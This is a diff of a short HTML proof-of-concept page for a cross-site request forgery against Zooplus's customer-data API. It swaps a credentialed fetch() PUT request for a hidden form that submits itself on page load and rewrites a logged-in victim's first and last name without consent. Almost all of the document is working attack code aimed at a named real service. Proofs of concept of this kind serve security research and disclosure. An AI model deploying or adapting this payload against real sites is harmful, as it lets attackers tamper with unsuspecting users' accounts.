@@ -2,32 +2,21 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Zooplus CSRF PoC</title>
+  <title>Zooplus CSRF Exploit (Form Version)</title>
 </head>
 <body>
-  <h1>Zooplus CSRF Exploit PoC</h1>
-  <p>If you're logged into Zooplus in this browser, your name will be changed without your consent.</p>
+  <h1>CSRF Exploit PoC - HTML Form Version</h1>
+  <p>If the victim is logged into Zooplus, this form will change their personal data automatically when loaded.</p>
 
+  <form action="https://www.zooplus.com/customer-data/api/v2/basicData" method="POST">
+    <input type="hidden" name="firstName" value="CSRFed">
+    <input type="hidden" name="lastName" value="FromForm">
+    <input type="submit" value="Trigger CSRF">
+  </form>
+
+  <!-- Optional: auto-submit the form on load -->
   <script>
-    fetch("https://www.zooplus.com/customer-data/api/v2/basicData", {
-      method: "PUT",
-      credentials: "include", // Important to send cookies
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        firstName: "Pwned",
-        lastName: "ViaCSRF"
-      })
-    }).then(response => {
-      if (response.ok) {
-        console.log("✅ Exploit executed. User data changed.");
-      } else {
-        console.warn("❌ Exploit failed. Status:", response.status);
-      }
-    }).catch(err => {
-      console.error("🚨 Error during exploit:", err);
-    });
+    document.forms[0].submit();
   </script>
 </body>
 </html>
